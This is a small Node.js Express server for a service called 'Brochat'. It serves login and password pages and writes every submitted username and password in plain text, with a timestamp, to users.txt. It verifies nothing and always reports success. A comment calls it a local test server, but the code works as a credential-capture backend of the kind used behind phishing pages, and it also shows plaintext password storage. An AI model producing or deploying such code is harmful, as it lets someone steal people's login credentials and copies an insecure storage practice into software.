// Tiny local test server for Brochat.
// Serves the HTML pages and saves submitted username/password to users.txt
// in plain text. This is for local testing only — never use this against
// real users or deploy it publicly.

const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(__dirname)); // serves brochat-login.html, brochat-password.html, etc.

app.get('/', (req, res) => {
  res.redirect('/brochat-login.html');
});

const LOG_FILE = path.join(__dirname, 'users.txt');

app.post('/api/login', (req, res) => {
  const identifier = (req.body.identifier || '').toString();
  const password = (req.body.password || '').toString();

  if (!identifier || !password) {
    return res.status(400).json({ ok: false, error: 'Missing identifier or password' });
  }

  const line = `${new Date().toISOString()} | ${identifier} | ${password}\n`;
  fs.appendFileSync(LOG_FILE, line);

  console.log('Saved submission:', identifier);
  res.json({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Brochat test server running at http://localhost:${PORT}`);
  console.log(`Open http://localhost:${PORT}/brochat-login.html to test`);
  console.log(`Submissions are saved to: ${LOG_FILE}`);
});
